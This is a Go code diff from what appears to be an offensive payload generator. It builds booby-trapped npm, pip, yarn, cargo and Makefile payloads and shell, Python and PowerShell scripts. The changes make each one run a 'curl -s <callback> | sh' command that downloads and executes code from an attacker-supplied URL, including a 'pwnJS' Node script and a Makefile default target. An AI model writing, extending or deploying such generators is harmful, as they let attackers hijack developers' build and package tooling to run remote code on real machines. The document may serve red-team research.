@@ -43,11 +43,11 @@ func NewNPMPayload(opts PayloadOptions) *NPMPayload {
 }
 
 func GenerateFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
-	switch strings.ToLower(strings.TrimSpace(tool)) {
+	switch ResolveTechnique(tool, "") {
 	case "bash", "powershell", "python":
 		return generateScriptFiles(tool, targets, callbackURL)
 	default:
-		payload := RecommendBestPayload([]Technique{{Name: tool}}, PayloadOptions{
+		payload := RecommendBestPayload([]Technique{{Name: ResolveTechnique(tool, "")}}, PayloadOptions{
 			CallbackURL: callbackURL,
 		})
 		if payload == nil {
@@ -65,7 +65,7 @@ func (n *NPMPayload) Generate() []GeneratedPayload {
 	var cmd string
 	switch {
 	case n.Options.CallbackURL != "":
-		cmd = curlPipeShCommand(n.Options.CallbackURL)
+		cmd = CurlPipeShCommand(n.Options.CallbackURL)
 	case n.Options.Command != "":
 		cmd = n.Options.Command
 	default:
@@ -154,7 +154,10 @@ func (p *PipPayload) Generate() []GeneratedPayload {
 	var payloads []GeneratedPayload
 
 	cmd := p.Options.Command
-	if cmd == "" {
+	switch {
+	case p.Options.CallbackURL != "":
+		cmd = CurlPipeShCommand(p.Options.CallbackURL)
+	case cmd == "":
 		cmd = "id"
 	}
 
@@ -249,7 +252,10 @@ func (y *YarnPayload) Generate() []GeneratedPayload {
 	var payloads []GeneratedPayload
 
 	cmd := y.Options.Command
-	if cmd == "" {
+	switch {
+	case y.Options.CallbackURL != "":
+		cmd = CurlPipeShCommand(y.Options.CallbackURL)
+	case cmd == "":
 		cmd = "id"
 	}
 
@@ -258,8 +264,6 @@ func (y *YarnPayload) Generate() []GeneratedPayload {
 `
 	pwnJS := fmt.Sprintf(`#!/usr/bin/env node
 require('child_process').execSync(%q, {stdio: 'inherit'});
-// Continue with real yarn
-require('child_process').execSync('npx yarn ' + process.argv.slice(2).join(' '), {stdio: 'inherit'});
 `, cmd)
 
 	payloads = append(payloads, GeneratedPayload{
@@ -289,7 +293,10 @@ func (c *CargoPayload) Generate() []GeneratedPayload {
 	var payloads []GeneratedPayload
 
 	cmd := c.Options.Command
-	if cmd == "" {
+	switch {
+	case c.Options.CallbackURL != "":
+		cmd = CurlPipeShCommand(c.Options.CallbackURL)
+	case cmd == "":
 		cmd = "id"
 	}
 
@@ -329,15 +336,16 @@ func (m *MakePayload) Generate() []GeneratedPayload {
 	var payloads []GeneratedPayload
 
 	cmd := m.Options.Command
-	if cmd == "" {
+	switch {
+	case m.Options.CallbackURL != "":
+		cmd = CurlPipeShCommand(m.Options.CallbackURL)
+	case cmd == "":
 		cmd = "id"
 	}
 
-	// Makefile with default target
 	makefile := fmt.Sprintf(`.PHONY: all
 all:
 	@%s
-	@$(MAKE) -f Makefile.real all 2>/dev/null || true
 `, cmd)
 
 	payloads = append(payloads, GeneratedPayload{
@@ -403,6 +411,7 @@ func RecommendBestPayload(techniques []Technique, opts PayloadOptions) *Generate
 
 func generatePayloadForTechnique(name string, opts PayloadOptions) *GeneratedPayload {
 	var payloads []GeneratedPayload
+	name = NormalizeTechnique(name)
 
 	switch name {
 	case "npm":
@@ -418,6 +427,18 @@ func generatePayloadForTechnique(name string, opts PayloadOptions) *GeneratedPay
 	}
 
 	if len(payloads) > 0 {
+		if opts.CallbackURL != "" {
+			for i := range payloads {
+				if strings.Contains(payloads[i].Content, opts.CallbackURL) {
+					return &payloads[i]
+				}
+				for _, value := range payloads[i].Properties {
+					if strings.Contains(value, opts.CallbackURL) {
+						return &payloads[i]
+					}
+				}
+			}
+		}
 		return &payloads[0]
 	}
 	return nil
@@ -430,7 +451,7 @@ func escapeJS(s string) string {
 	return s
 }
 
-func curlPipeShCommand(callbackURL string) string {
+func CurlPipeShCommand(callbackURL string) string {
 	return fmt.Sprintf("curl -s '%s' | sh", shellEscape(callbackURL))
 }
 
@@ -438,18 +459,26 @@ func shellEscape(s string) string {
 	return strings.ReplaceAll(s, "'", "'\"'\"'")
 }
 
+func powershellSingleQuoteEscape(s string) string {
+	return strings.ReplaceAll(s, "'", "''")
+}
+
+func PowershellCurlPipeShCommand(callbackURL string) string {
+	return fmt.Sprintf("sh -c '%s'", powershellSingleQuoteEscape(CurlPipeShCommand(callbackURL)))
+}
+
 func generateScriptFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
 	var shebang, payload string
 	switch strings.ToLower(strings.TrimSpace(tool)) {
 	case "powershell":
 		shebang = "#!/usr/bin/env pwsh"
-		payload = fmt.Sprintf("Invoke-Expression (Invoke-WebRequest -Uri '%s').Content", callbackURL)
+		payload = PowershellCurlPipeShCommand(callbackURL)
 	case "python":
 		shebang = "#!/usr/bin/env python3"
-		payload = fmt.Sprintf("import os; os.system(%q)", curlPipeShCommand(callbackURL))
+		payload = fmt.Sprintf("import os; os.system(%q)", CurlPipeShCommand(callbackURL))
 	default:
 		shebang = "#!/bin/sh"
-		payload = curlPipeShCommand(callbackURL)
+		payload = CurlPipeShCommand(callbackURL)
 	}
 
 	content := shebang + "\n" + payload + "\n"
